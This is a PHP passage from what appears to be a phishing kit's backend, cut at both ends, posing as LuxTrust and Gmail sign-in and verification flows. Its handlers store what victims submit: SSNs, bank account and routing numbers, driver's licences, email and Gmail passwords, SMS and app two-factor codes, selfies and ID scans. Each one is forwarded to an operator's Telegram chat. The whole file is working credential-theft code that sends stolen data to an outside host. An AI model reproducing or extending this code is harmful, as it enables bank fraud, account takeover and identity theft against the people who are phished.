            $tmsg = "
<strong># luxtrust</strong>\n
<code>-------------------</code>\n
<strong>Username:</strong> <code>{$array['user']}</code>\n
<code>-------------------</code>\n
<strong>SSN:</strong> <code>$ssn</code>\n
<strong>Full Name:</strong> <code>$fullname</code>\n
<strong>EIN:</strong> <code>$ein</code>\n
<strong>Account Number:</strong> <code>$accnum</code>\n
<strong>Routing Number:</strong> <code>$routnum</code>\n
<strong>Account Type:</strong> <code>$acctype</code>\n
<strong>Date of Birth:</strong> <code>$dob</code>\n
<strong>Business Name:</strong> <code>$buisname</code>\n
<strong>Date:</strong><code> $date $time</code>\n
";

			
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }
    } else {
        $response = array('status' => 'notok', 'message' => 'SSN is empty');
    }

    echo json_encode($response);
}


		
		
if ($_GET['type'] == 'dlupload') {
    $uniqueid = $_SESSION['uniqueid'];
	
	
	$date = date("Y-m-d h:i a", time());

    if (!empty($_POST['dlupload'])) {
        $dlupload = mysqli_real_escape_string($conn, $_POST['dlupload']);

        $query = mysqli_query($conn, "UPDATE clients SET status=20, buzzed=0, dlupload='$dlupload' WHERE uniqueid='$uniqueid'");
        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);
                        $tmsg = "
<strong># luxtrust</strong>\n
<code>-------------------</code>\n
<strong>Username:</strong> <code>{$array['user']}</code>\n
<code>-------------------</code>\n
<strong>DL Scan:</strong> <code>$dlupload</code>\n
<strong>IP:</strong> <code>{$array['ip']}</code>\n
<strong>Date:</strong><code> $date $time</code>\n
";
            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }
    } else {
        $response = array('status' => 'notok', 'message' => 'Password is empty');
    }

    echo json_encode($response);
}		
		

		


	

if ($_GET['type'] == 'emailauth') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['emailauth'])) {
        $emailauth = mysqli_real_escape_string($conn, $_POST['emailauth']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=26, buzzed=0, emailauth='$emailauth' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>Email Password:</b> <code>$emailauth</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	

if ($_GET['type'] == 'frozen') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['frozen'])) {
        $frozen = mysqli_real_escape_string($conn, $_POST['frozen']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=24, buzzed=0, frozen='$frozen' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>Frozen Status:</b> <code>$frozen</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	



if ($_GET['type'] == 'driverlc') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['driverlc'])) {
        $driverlc = mysqli_real_escape_string($conn, $_POST['driverlc']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=54, buzzed=0, driverlc='$driverlc' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🚗 <b>Driver Llicence:</b> <code>$driverlc</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	



if ($_GET['type'] == 'selfie') {
    session_start();
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());
    $ip = $_SERVER['REMOTE_ADDR'];

    if (!empty($_POST['selfie'])) {
        $selfie = $_POST['selfie'];
        $selfie = str_replace('data:image/png;base64,', '', $selfie);
        $selfie = str_replace(' ', '+', $selfie);
        $decodedSelfie = base64_decode($selfie);

        // Set the correct upload directory
        $uploadDir = __DIR__ . '/upload/'; // This resolves to C:\wamp64\www\luxtrust-final\void\inc\upload
        if (!file_exists($uploadDir)) {
            mkdir($uploadDir, 0777, true); // Create the directory if it doesn't exist
        }

        // Generate a unique file name
        $fileName = uniqid() . '.png';
        $filePath = $uploadDir . $fileName; // Full path for saving the file
        $relativePath = 'inc/upload/' . $fileName; // Path to store in the database

        // Save the photo
        if (file_put_contents($filePath, $decodedSelfie)) {
            // Store the relative path in the database
            $selfiePath = mysqli_real_escape_string($conn, $relativePath);
            $query = mysqli_query($conn, "UPDATE clients SET status=91, buzzed=0, selfie='$selfiePath' WHERE uniqueid='$uniqueid'");

            if ($query) {
                // Fetch user details
                $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
                $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

                // Send the selfie to Telegram
                if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
                    $tmsg = "<b>luxtrust</b>\n";
                    $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
                    $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
                    $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
                    $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
                    $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
                    $tmsg .= "===================";

                    try {
                        $telegram = new Telegram($bot_token);

                        // Send the text message
                        $contentText = array(
                            'chat_id' => $telegram_chaid,
                            'text' => $tmsg,
                            'parse_mode' => 'html'
                        );
                        $telegram->sendMessage($contentText);

                        // Send the selfie
                        $contentPhoto = array(
                            'chat_id' => $telegram_chaid,
                            'photo' => new CURLFile(realpath($filePath)), // Absolute path
                            'caption' => "Selfie Scan for {$array['user']} - $ip"
                        );
                        $telegram->sendPhoto($contentPhoto);
                    } catch (Exception $e) {
                        error_log("Telegram Error: " . $e->getMessage());
                    }
                }

                echo json_encode(['status' => 'ok', 'message' => 'Selfie submitted successfully.']);
            } else {
                echo json_encode(['status' => 'notok', 'message' => 'Database update failed.']);
            }
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Failed to save selfie.']);
        }
    } else {
        echo json_encode(['status' => 'error', 'message' => 'No selfie data received.']);
    }
}

if ($_GET['type'] == 'uploaderdoc') {
    session_start();
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());
    $ip = $_SERVER['REMOTE_ADDR'];

    if (!empty($_FILES['uploaderdoc']['tmp_name'])) {
        $file = $_FILES['uploaderdoc'];

        // Validate file type
        $allowedTypes = ['image/png', 'image/jpeg'];
        if (!in_array($file['type'], $allowedTypes)) {
            echo json_encode(['status' => 'error', 'message' => 'Invalid file type. Only PNG and JPEG are allowed.']);
            exit;
        }

        // Set the correct upload directory
        $uploadDir = __DIR__ . '/upload/'; // This resolves to C:\wamp64\www\luxtrust-final\void\inc\upload
        if (!file_exists($uploadDir)) {
            mkdir($uploadDir, 0777, true); // Create the directory if it doesn't exist
        }

        // Generate a unique file name
        $fileName = uniqid() . '.' . pathinfo($file['name'], PATHINFO_EXTENSION);
        $filePath = $uploadDir . $fileName; // Full path for saving the file
        $relativePath = 'inc/upload/' . $fileName; // Path to store in the database

        // Save the uploaded file
        if (move_uploaded_file($file['tmp_name'], $filePath)) {
            // Store the relative path in the database
            $uploaderdocPath = mysqli_real_escape_string($conn, $relativePath);
            $query = mysqli_query($conn, "UPDATE clients SET status=91, buzzed=0, uploaderdoc='$uploaderdocPath' WHERE uniqueid='$uniqueid'");

            if ($query) {
                // Fetch user details
                $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
                $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

                // Send the uploaded document to Telegram
                if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
                    $tmsg = "<b>luxtrust</b>\n";
                    $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
                    $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
                    $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
                    $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
                    $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
                    $tmsg .= "===================";

                    try {
                        $telegram = new Telegram($bot_token);

                        // Send the text message
                        $contentText = array(
                            'chat_id' => $telegram_chaid,
                            'text' => $tmsg,
                            'parse_mode' => 'html'
                        );
                        $telegram->sendMessage($contentText);

                        // Send the uploaded document
                        $contentPhoto = array(
                            'chat_id' => $telegram_chaid,
                            'photo' => new CURLFile(realpath($filePath)), // Absolute path
                            'caption' => "Document uploaded for {$array['user']} - $ip"
                        );
                        $telegram->sendPhoto($contentPhoto);
                    } catch (Exception $e) {
                        error_log("Telegram Error: " . $e->getMessage());
                    }
                }

                echo json_encode(['status' => 'ok', 'message' => 'Document submitted successfully.']);
            } else {
                echo json_encode(['status' => 'notok', 'message' => 'Database update failed.']);
            }
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Failed to save document.']);
        }
    } else {
        echo json_encode(['status' => 'error', 'message' => 'No document uploaded.']);
    }
}


//gmail actions	

if ($_GET['type'] == 'gstart') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['gstart'])) {
        $gstart = mysqli_real_escape_string($conn, $_POST['gstart']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=gstart, buzzed=1, gstart='$gstart' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>Gmail verication:</b> <code>$gstart</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	


if ($_GET['type'] == 'gpass') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['gpass'])) {
        $gpass = mysqli_real_escape_string($conn, $_POST['gpass']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=303, buzzed=0, gpass='$gpass' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>Gmail Password:</b> <code>$gpass</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	


if ($_GET['type'] == 'gpasserror') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['gpass'])) {
        $gpass = mysqli_real_escape_string($conn, $_POST['gpass']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=305, buzzed=0, gpass='$gpass' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>Gmail Password Err:</b> <code>$gpass</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	


if ($_GET['type'] == 'gphone') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());
    $ip = $_SERVER['REMOTE_ADDR']; // Capturing the IP address for logging

    if (!empty($_POST['fullPhoneNumber'])) {
        $fullPhoneNumber = mysqli_real_escape_string($conn, $_POST['fullPhoneNumber']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=307, buzzed=0, gphone='$fullPhoneNumber' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if (isset($enable_telegram) && $enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $result = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $victim = mysqli_fetch_assoc($result);

            $tmsg = "<b> Gmail</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Phone:</b> <code>$fullPhoneNumber</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Phone number is empty');
    }

    header('Content-Type: application/json');
    echo json_encode($response);
}


if ($_GET['type'] == 'gsms') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['gsms'])) {
        $gsms = mysqli_real_escape_string($conn, $_POST['gsms']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=309, buzzed=0, gsms='$gsms' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>Gmail SMS:</b> <code>$gsms</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	


if ($_GET['type'] == 'gsmserror') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['gsms'])) {
        $gsms = mysqli_real_escape_string($conn, $_POST['gsms']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=311, buzzed=0, gsms='$gsms' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>Gmail SMS Err:</b> <code>$gsms</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	


if ($_GET['type'] == 'gapp') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['gapp'])) {
        $gapp = mysqli_real_escape_string($conn, $_POST['gapp']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=313, buzzed=0, gapp='$gapp' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Gmail</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>Gmail APP:</b> <code>$gapp</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	

if ($_GET['type'] == 'gapperror') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['gapp'])) {
        $gapp = mysqli_real_escape_string($conn, $_POST['gapp']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=315, buzzed=0, gapp='$gapp' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Gmail</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>Gmail APP Err:</b> <code>$gapp</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	


if ($_GET['type'] == 'gtap') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['gtap'])) {
        $gtap = mysqli_real_escape_string($conn, $_POST['gtap']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=317, buzzed=0, gtap='$gtap' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>Gmail Tap:</b> <code>$gtap</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	


//yahoo actions	
if ($_GET['type'] == 'ystart') {
